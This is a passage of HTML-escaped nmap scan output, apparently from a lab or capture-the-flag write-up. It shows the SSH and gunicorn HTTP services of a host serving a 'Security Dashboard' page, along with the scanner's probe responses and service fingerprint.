-|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
-80/tcp open  http    gunicorn                                                                                                      
-| fingerprint-strings:                                                                                                             
-|   FourOhFourRequest:                                                                                                             
-|     HTTP/1.0 404 NOT FOUND                                                                                                       
-|     Server: gunicorn                                                                                                             
-|     Date: Mon, 23 Aug 2021 00:31:15 GMT                                                                                          
-|     Connection: close                                                                                                            
-|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8                                                                                       
-|     Content-Length: 232                                                                                                          
-|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                      
-|     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;                                                                                                 
-|     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;                                                                                                           
-|     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/
-p&amp;gt;                                                                                                                                 
-|   GetRequest:                                                                                                                    
-|     HTTP/1.0 200 OK                                                                                                              
-|     Server: gunicorn                                                                                                             
-|     Date: Mon, 23 Aug 2021 00:31:09 GMT                                                                                          
-|     Connection: close                                                                                                            
-|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8                                                                                       
-|     Content-Length: 19386                                                                                                        
-|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;                                                                                                              
-|     &amp;lt;html &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no-js&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                               
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                       
-|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                       
-|     &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;x-ua-compatible&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ie=edge&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                        
-|     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;                                                                                            
-|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                         
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;shortcut icon&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/images/icon/favicon.ico&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                           
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/bootstrap.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                 
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/font-awesome.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/themify-icons.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/metisMenu.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/owl.carousel.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                              
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/static/css/slicknav.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
-|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; amchar                                                
-|   HTTPOptions:                                                                                                                   
-|     HTTP/1.0 200 OK
-|     Server: gunicorn
-|     Date: Mon, 23 Aug 2021 00:31:10 GMT
-|     Connection: close
-|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
-|     Allow: OPTIONS, HEAD, GET
-|     Content-Length: 0
-|   RTSPRequest: 
-|     HTTP/1.1 400 Bad Request
-|     Connection: close
-|     Content-Type: text/html
-|     Content-Length: 196
-|     &amp;lt;html&amp;gt;
-|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-|     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt; 
-|     &amp;lt;/head&amp;gt;
-|     &amp;lt;body&amp;gt;
-|     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
-|     Invalid HTTP Version &amp;amp;#x27&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Invalid HTTP Version: &amp;amp;#x27&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;RTSP/1.0&amp;amp;#x27&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#x27&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-|     &amp;lt;/body&amp;gt;
-|_    &amp;lt;/html&amp;gt;
-|_http-server-header: gunicorn
-|_http-title: Security Dashboard 
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://
-nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port80-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.91%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8/22%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6122EC4C%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GetR
-SF:equest,2FE5,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Server:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20gunicorn&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
-SF:Mon,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2023&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Aug&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2000:31:09&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:nContent-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/html;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20charset=utf-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20193
-SF:86&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;!DOCTYPE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20html&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20class=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;no-js&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20lang=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;en&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;meta&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20charset=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2
-SF:0&amp;lt;meta&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20http-equiv=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x-ua-compatible&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20content=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ie=edge&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:x20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;title&amp;gt;Security&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Dashboard&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;meta&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:x20name=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;viewport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20content=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;width=device-width,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20initial-scale=
-SF:1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;shortcut&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20icon&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20type=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;image
-SF:/png&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/images/icon/favicon&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ico&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;
-SF:link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/css/bootstrap&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/css/fon
-SF:t-awesome&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
-SF:href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/css/themify-icons&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/css/metisMenu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2
-SF:0&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/static/css/owl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;carousel&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span 